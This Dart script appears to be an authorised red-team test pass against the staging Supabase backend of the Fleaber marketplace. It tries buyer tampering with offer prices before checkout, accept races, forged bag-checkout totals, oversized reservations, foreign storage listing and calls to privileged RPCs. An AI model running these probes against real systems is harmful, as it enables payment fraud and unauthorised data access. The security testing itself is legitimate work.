/// Blind independent red-team PASS 3 — composition + offer authority + races.
/// Staging only. No production. No Fase 4. No fixes.
import 'dart:convert';
import 'dart:io';

import 'package:http/http.dart' as http;

import '../live_ops_staging_client.dart';

const projectMust = 'fxdknzrqjenzqcvnwqqq';
const prefix = 'RT1719P3';

final matrix = <Map<String, dynamic>>[];
final findings = <Map<String, dynamic>>[];

void rec(String surface, String attack, String identity, String result,
    {String impact = '', Object? evidence}) {
  matrix.add({
    'surface': surface,
    'attack': attack,
    'identity': identity,
    'result': result.length > 500 ? '${result.substring(0, 500)}…' : result,
    'impact': impact,
    'evidence': evidence,
  });
}

void finding(String id, String sev, String title, String actor, String impact,
    {Object? evidence}) {
  findings.add({
    'id': id,
    'severity': sev,
    'title': title,
    'actor': actor,
    'impact': impact,
    'estado': 'ABERTO',
    'evidence': evidence,
  });
  stdout.writeln('FINDING $id $sev $title');
}

Map<String, String> hJwt(String anon, String jwt) => {
      'apikey': anon,
      'Authorization': 'Bearer $jwt',
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
    };

String brief(http.Response r) {
  var b = r.body;
  if (b.length > 320) b = '${b.substring(0, 320)}…';
  return '${r.statusCode} $b';
}

Future<http.Response> rest(String url, String method, String path,
    Map<String, String> headers, [Object? body]) {
  final u = Uri.parse('$url/rest/v1/$path');
  final b = body == null ? null : jsonEncode(body);
  return switch (method) {
    'GET' => http.get(u, headers: headers),
    'POST' => http.post(u, headers: headers, body: b),
    'PATCH' => http.patch(u, headers: headers, body: b),
    'DELETE' => http.delete(u, headers: headers, body: b),
    _ => throw ArgumentError(method),
  };
}

Future<http.Response> rpcRaw(
    String url, String fn, Map<String, dynamic> params, Map<String, String> h) {
  return http.post(Uri.parse('$url/rest/v1/rpc/$fn'),
      headers: h, body: jsonEncode(params));
}

Future<http.Response> edge(String url, String fn, Object? body,
    {required String anon, String? jwt}) {
  return http.post(Uri.parse('$url/functions/v1/$fn'),
      headers: {
        'apikey': anon,
        'Authorization': 'Bearer ${jwt ?? anon}',
        'Content-Type': 'application/json',
      },
      body: body == null ? null : jsonEncode(body));
}

String? idFrom(http.Response r) {
  if (r.statusCode >= 400) return null;
  final b = jsonDecode(r.body);
  if (b is List && b.isNotEmpty) return b.first['id']?.toString();
  if (b is Map) return b['id']?.toString();
  return null;
}

int n(Object? v) {
  if (v is int) return v;
  if (v is num) return v.round();
  return int.tryParse('$v') ?? 0;
}

double d(Object? v) {
  if (v is num) return v.toDouble();
  return double.tryParse('$v') ?? 0;
}

Future<void> main() async {
  final env = loadLiveOpsStagingEnv();
  final url = normalizeSupabaseProjectUrl(envRequire(env, 'SUPABASE_URL'));
  if (!url.contains(projectMust)) exit(2);
  final anon = envRequire(env, 'SUPABASE_ANON_KEY');
  final svc = envRequire(env, 'SUPABASE_SERVICE_ROLE_KEY');
  final buyerId = envRequire(env, 'LIVE_OPS_TEST_BUYER_ID');
  final sellerId = envRequire(env, 'LIVE_OPS_TEST_SELLER_ID');
  final admin = LiveOpsStagingClient(
      url: url, anonKey: anon, serviceRoleKey: svc);
  final buyerJwt = await admin.signIn(
      email: envRequire(env, 'LIVE_OPS_TEST_BUYER_EMAIL'),
      password: envRequire(env, 'LIVE_OPS_TEST_BUYER_PASSWORD'));
  final sellerJwt = await admin.signIn(
      email: envRequire(env, 'LIVE_OPS_TEST_SELLER_EMAIL'),
      password: envRequire(env, 'LIVE_OPS_TEST_SELLER_PASSWORD'));
  final hB = hJwt(anon, buyerJwt);
  final hS = hJwt(anon, sellerJwt);

  final stamp = DateTime.now().toUtc().millisecondsSinceEpoch;
  final helperId = await admin.createAdminUser(
      email: '$prefix-h-$stamp@fleaber.invalid', password: 'Rt1719-P3-Help-9x!');
  final helperJwt = await admin.signIn(
      email: '$prefix-h-$stamp@fleaber.invalid', password: 'Rt1719-P3-Help-9x!');
  final hH = hJwt(anon, helperJwt);

  final prod = await admin.insert('products', {
    'seller_id': sellerId,
    'title': '$prefix offer-auth',
    'price': 30.00,
    'quantity': 4,
    'state': 'Bom',
    'is_sold': false,
    'list_on_marketplace': true,
  });
  final pid = prod['id'].toString();

  Future<Map<String, dynamic>?> row(String table, String? id) async {
    if (id == null) return null;
    final rows = await admin.select(table, filter: 'id=eq.$id', limit: 1);
    return rows.isEmpty ? null : rows.first;
  }

  // ---- P3-A: buyer mutates SELLER pending offer then accepts ----
  final sOffer = await rest(url, 'POST', 'product_offers', hS, {
    'product_id': pid,
    'buyer_id': buyerId,
    'seller_id': sellerId,
    'amount': 28.00,
    'list_price': 30.00,
    'offered_by': 'seller',
    'status': 'pending',
  });
  final sOfferId = idFrom(sOffer);
  rec('product_offers', 'SELLER INSERT 28€ to buyer', 'seller', brief(sOffer));
  if (sOfferId != null) {
    final mut = await rest(
        url, 'PATCH', 'product_offers?id=eq.$sOfferId', hB, {'amount': 0.50});
    final afterMut = await row('product_offers', sOfferId);
    rec('product_offers', 'BUYER PATCH amount on seller offer', 'buyer',
        brief(mut),
        impact: 'amount=${afterMut?['amount']} status=${afterMut?['status']}',
        evidence: afterMut);
    final acc = await rest(url, 'PATCH', 'product_offers?id=eq.$sOfferId', hB, {
      'status': 'accepted',
      'amount': 28.00,
    });
    final afterAcc = await row('product_offers', sOfferId);
    rec('product_offers', 'BUYER accept sending amount=28 after mut 0.50',
        'buyer', brief(acc),
        impact:
            'status=${afterAcc?['status']} amount=${afterAcc?['amount']}',
        evidence: afterAcc);
    if (afterAcc != null &&
        '${afterAcc['status']}' == 'accepted' &&
        d(afterAcc['amount']) < 5) {
      final o = await rest(url, 'POST', 'orders', hB, {
        'product_id': pid,
        'buyer_id': buyerId,
        'seller_id': sellerId,
        'quantity': 1,
        'status': 'reserva_pendente',
        'payment_method': 'Pagamento na app',
        'shipping_method': 'Entrega em mão (€0.00)',
        'product_offer_id': sOfferId,
      });
      final oid = idFrom(o);
      final orow = await row('orders', oid);
      rec('orders', 'INSERT with mutated accepted seller-offer', 'buyer',
          brief(o),
          impact:
              'contract=${orow?['contract_unit_cents']} price=${orow?['price_total']} offer=${orow?['product_offer_id']}',
          evidence: orow);
      if (oid != null) {
        final pay = await edge(url, 'create-payment-intent', {
          'buyer_id': buyerId,
          'order_id': oid,
          'shipping_method': 'Entrega em mão (€0.00)',
        }, anon: anon, jwt: buyerJwt);
        rec('checkout', 'Stripe after mutated seller-offer accept', 'buyer',
            brief(pay), evidence: pay.body);
        Map parsed = {};
        try {
          parsed = jsonDecode(pay.body) as Map;
        } catch (_) {}
        final cents = n(parsed['server_amount_cents']);
        if (pay.statusCode < 400 && cents > 0 && cents < 1500) {
          finding(
              'RT1719-20',
              'P1',
              'Buyer mutates seller pending offer amount then accepts; Stripe charges mutated price',
              'buyer JWT',
              'server_amount_cents=$cents vs seller intended 28€ / catalog 30€',
              evidence: {
                'offer': afterAcc,
                'order': orow,
                'checkout': pay.body,
              });
        }
      }
    }
  }

  // ---- P3-B: seller accept with amount pin vs patched own-buyer offer ----
  final bOffer = await rest(url, 'POST', 'product_offers', hB, {
    'product_id': pid,
    'buyer_id': buyerId,
    'seller_id': sellerId,
    'amount': 22.00,
    'list_price': 30.00,
    'offered_by': 'buyer',
  });
  final bOfferId = idFrom(bOffer);
  if (bOfferId != null) {
    await rest(
        url, 'PATCH', 'product_offers?id=eq.$bOfferId', hB, {'amount': 0.50});
    final pin = await rest(url, 'PATCH', 'product_offers?id=eq.$bOfferId', hS, {
      'status': 'accepted',
      'amount': 22.00,
    });
    final pinned = await row('product_offers', bOfferId);
    rec('product_offers', 'SELLER accept pinning amount=22 after buyer 0.50',
        'seller', brief(pin),
        impact: 'final_amount=${pinned?['amount']} status=${pinned?['status']}',
        evidence: pinned);
  }

  // ---- P3-C: helper cannot mutate others' offer ----
  if (sOfferId != null) {
    final x = await rest(
        url, 'PATCH', 'product_offers?id=eq.$sOfferId', hH, {'amount': 0.01});
    rec('product_offers', 'helper PATCH foreign offer', 'helper', brief(x));
  }

  // ---- P3-D: 10x concurrent amount patch vs accept ----
  var cheapWins = 0;
  for (var i = 0; i < 10; i++) {
    final p = await admin.insert('products', {
      'seller_id': sellerId,
      'title': '$prefix race-off $i',
      'price': 18.00,
      'quantity': 2,
      'state': 'Bom',
      'is_sold': false,
      'list_on_marketplace': true,
    });
    final idp = p['id'].toString();
    final off = await rest(url, 'POST', 'product_offers', hB, {
      'product_id': idp,
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'amount': 15.00,
      'list_price': 18.00,
      'offered_by': 'buyer',
    });
    final oid = idFrom(off);
    if (oid == null) continue;
    final fPatch = rest(
        url, 'PATCH', 'product_offers?id=eq.$oid', hB, {'amount': 0.50});
    final fAcc = rest(url, 'PATCH', 'product_offers?id=eq.$oid', hS, {
      'status': 'accepted',
    });
    await Future.wait([fPatch, fAcc]);
    final fin = await row('product_offers', oid);
    if (fin != null &&
        '${fin['status']}' == 'accepted' &&
        d(fin['amount']) <= 0.50) {
      cheapWins++;
    }
  }
  rec('offer race x10', 'patch 0.50 vs seller accept', 'buyer+seller',
      'accepted_at_0.50=$cheapWins/10');

  // ---- P3-E: bag mix two products / shipping ----
  final p2 = await admin.insert('products', {
    'seller_id': sellerId,
    'title': '$prefix bag-b',
    'price': 10.00,
    'quantity': 3,
    'state': 'Bom',
    'is_sold': false,
    'list_on_marketplace': true,
  });
  final oA = await rest(url, 'POST', 'orders', hB, {
    'product_id': pid,
    'buyer_id': buyerId,
    'seller_id': sellerId,
    'quantity': 1,
    'payment_method': 'Pagamento na app',
    'shipping_method': 'Envio Transportadora (€3.50)',
    'status': 'reserva_pendente',
  });
  final oB = await rest(url, 'POST', 'orders', hB, {
    'product_id': p2['id'].toString(),
    'buyer_id': buyerId,
    'seller_id': sellerId,
    'quantity': 1,
    'payment_method': 'Pagamento na app',
    'shipping_method': 'Entrega em mão (€0.00)',
    'status': 'reserva_pendente',
  });
  final idA = idFrom(oA);
  final idB = idFrom(oB);
  rec('orders', 'bag line A carrier', 'buyer', brief(oA));
  rec('orders', 'bag line B hand', 'buyer', brief(oB));
  if (idA != null && idB != null) {
    final bag = await edge(url, 'create-payment-intent', {
      'buyer_id': buyerId,
      'bag_checkout': true,
      'bag_lines': [
        {'order_id': idA, 'line_total_cents': 1, 'quantity': 99},
        {'order_id': idB, 'line_total_cents': 1},
      ],
      'amount': 50,
      'shipping_method': 'Entrega em mão (€0.00)',
    }, anon: anon, jwt: buyerJwt);
    rec('bag checkout', 'hostile line_total + shipping hand vs sealed carrier',
        'buyer', brief(bag), evidence: bag.body);
  }

  // ---- P3-F: reservation qty via table ----
  final lives = await admin.select('lives', filter: 'seller_id=eq.$sellerId', limit: 1);
  if (lives.isNotEmpty) {
    final liveId = lives.first['id'].toString();
    final items = await admin.select('live_items',
        filter: 'live_id=eq.$liveId', limit: 1);
    if (items.isNotEmpty) {
      final li = items.first['id'].toString();
      final resIns = await rest(url, 'POST', 'live_reservation_requests', hB, {
        'live_id': liveId,
        'live_item_id': li,
        'seller_id': sellerId,
        'buyer_id': buyerId,
        'requested_qty': 99,
        'status': 'accepted',
        'source': 'fleaber_live',
      });
      rec('live_reservation_requests', 'INSERT qty=99 status=accepted', 'buyer',
          brief(resIns));
      final rid = idFrom(resIns);
      if (rid != null) {
        final acc = await rest(url, 'PATCH',
            'live_reservation_requests?id=eq.$rid', hB, {'status': 'accepted'});
        rec('live_reservation_requests', 'buyer PATCH accepted', 'buyer',
            brief(acc), evidence: await row('live_reservation_requests', rid));
      }
    }
  }

  // ---- P3-G: JWT alg confusion / foreign refund / raffle ----
  final raffle = await rpcRaw(url, 'batata_create_raffle_prize_order', {
    'p_live_id': lives.isEmpty ? '00000000-0000-0000-0000-000000000001' : lives.first['id'],
    'p_winner_id': buyerId,
  }, hB);
  rec('rpc/raffle_prize', 'buyer create prize order', 'buyer', brief(raffle));

  // ---- P3-H: storage list dispute path ----
  final st = await http.post(
    Uri.parse('$url/storage/v1/object/list/order_disputes'),
    headers: hB,
    body: jsonEncode({'prefix': '$sellerId', 'limit': 20}),
  );
  rec('storage/order_disputes', 'buyer list seller prefix', 'buyer', brief(st));

  // ---- P3-I: GET settle on 118c session from pass2 if still unpaid ----
  // skip missing id

  // ---- P3-J: remaining definer RPCs shotgun (named from pass2 list) ----
  final pass2 = jsonDecode(
    File('tool/redteam_blind_indep_20260830T1719/out/pass2.json').readAsStringSync(),
  ) as Map;
  // rpcs stored in pass2 matrix first row evidence
  List rpcs = [];
  for (final raw in (pass2['matrix'] as List)) {
    final m = Map<String, dynamic>.from(raw as Map);
    if (m['surface'] == 'PostgREST' && m['evidence'] is List) {
      rpcs = List.from(m['evidence'] as List);
    }
  }
  final extra = rpcs.where((n) {
    final l = '$n'.toLowerCase();
    return l.contains('credit') ||
        l.contains('debit') ||
        l.contains('admin') ||
        l.contains('sql') ||
        l.contains('grant') ||
        l.contains('internal') ||
        l.contains('settle') ||
        l.contains('convert') ||
        l.contains('stock');
  }).toList();
  rec('rpc', 'pass3 extra names', 'observe', '${extra.length}', evidence: extra);
  for (final fn in extra.take(25)) {
    final r = await rpcRaw(url, '$fn', {}, hB);
    if (r.statusCode < 400) {
      rec('rpc/$fn', 'buyer empty execute', 'buyer', brief(r), impact: 'OK');
    }
  }

  final out = Directory('tool/redteam_blind_indep_20260830T1719/out');
  out.createSync(recursive: true);
  File('${out.path}/pass3.json').writeAsStringSync(
    const JsonEncoder.withIndent('  ').convert({
      'pass': 3,
      'product_id': pid,
      'matrix': matrix,
      'findings': findings,
    }),
  );
  stdout.writeln('PASS3 written findings=${findings.length} matrix=${matrix.length}');
}
